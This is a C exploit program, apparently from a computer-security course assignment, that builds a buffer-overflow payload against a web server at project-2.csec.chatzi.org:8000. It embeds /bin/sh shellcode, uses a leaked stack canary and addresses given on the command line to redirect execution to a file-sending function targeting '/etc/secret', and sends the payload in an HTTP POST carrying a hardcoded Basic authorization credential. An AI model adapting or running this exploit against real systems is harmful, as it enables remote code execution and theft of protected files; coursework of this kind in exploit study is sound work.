#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#define NOP 0x90

#ifndef offsetA
#define offsetA 0
#endif

#ifndef offsetB
#define offsetB 0
#endif

// #define offsetA 168
// #define offsetB 21218

char shellcode[] = "U\211\345\353\036^1\300\210F\a\211v\b\211F\f\260\v\211\363\215N\b1\322̀1\300@1\333̀\350\335\377\377\377/bin/sh";
char argument[] = "/etc/secret&";

unsigned long
get_esp(void) { __asm__("movl %esp,%eax"); }

void error(const char *msg)
{
    perror(msg);
    exit(0);
}

int main(int argc, char *argv[])
{
    unsigned long canari = strtoul(argv[1], (char **)0, 0);
    unsigned long buff_addr_no_offset = strtoul(argv[2], (char **)0, 0);
    unsigned long send_file_fun_addr_no_offset = strtoul(argv[3], (char **)0, 0);

    int payload_size = 89;
    char *payload = malloc(payload_size * sizeof(char));

    long buff_address = buff_addr_no_offset - offsetA;
    for (int i = 0; i < payload_size / 4; i++)
    {
        ((long *)payload)[i] = buff_address;
        if (i == 15)
            ((long *)payload)[i] = canari + 0x26;
        else if (i == 19 || i == 20)
            ((long *)payload)[i] = send_file_fun_addr_no_offset - offsetB;
    }

    for (int i = 0; i < strlen(argument); i++)
        payload[i] = argument[i];

    payload[payload_size - 1] = '\0';

    /* first what are we going to send and where are we going to send it? */
    int portno = 8000;
    char *host = "project-2.csec.chatzi.org";
    char *message_fmt = (char *)malloc(sizeof(char) * (payload_size + 400));
    strcpy(message_fmt, "POST / HTTP/1.1\r\nHost:project-2.csec.chatzi.org:8000\r\nUser-Agent: curl/7.81.0\r\nAccept: /\r\nAccept-Encoding: deflate, gzip, br, zstd\r\nAuthorization: Basic YWRtaW46OGM2ZTJmMzRkZjA4ZTJmODc5ZTYxZWViOWU4YmE5NmY4ZDllOTZkODAzMzg3MGY4MDEyNzU2N2QyNzBkN2Q5Ngo=\r\nContent-Length: 11 \r\nContent-Type: application/x-www-form-urlencoded \r\n\r\n");
    strncat(message_fmt, payload, payload_size);
    strcat(message_fmt, "\r\n\r\n");

    struct hostent *server;
    struct sockaddr_in serv_addr;
    int sockfd, bytes, sent, received, total;
    char message[1024], response[4096];

    /* create the socket */
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0)
        error("ERROR opening socket");

    /* lookup the ip address */
    server = gethostbyname(host);
    if (server == NULL)
        error("ERROR no such host");

    /* fill in the structure */
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(portno);
    memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);

    /* connect the socket */
    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
        error("ERROR connecting");

    /* send the request */
    total = strlen(message_fmt);
    sent = 0;
    do
    {
        bytes = write(sockfd, message_fmt + sent, total - sent);
        if (bytes < 0)
            error("ERROR writing message to socket");
        if (bytes == 0)
            break;
        sent += bytes;
    } while (sent < total);

    total = 0;
    fprintf(stderr, "\n");
    while (1)
    {
        bytes = read(sockfd, response, 1);
        if (bytes < 1)
        {
            return 0;
        }
        fprintf(stderr, "%c", *response);
        fflush(0);
    }

    close(sockfd);
    return 0;
}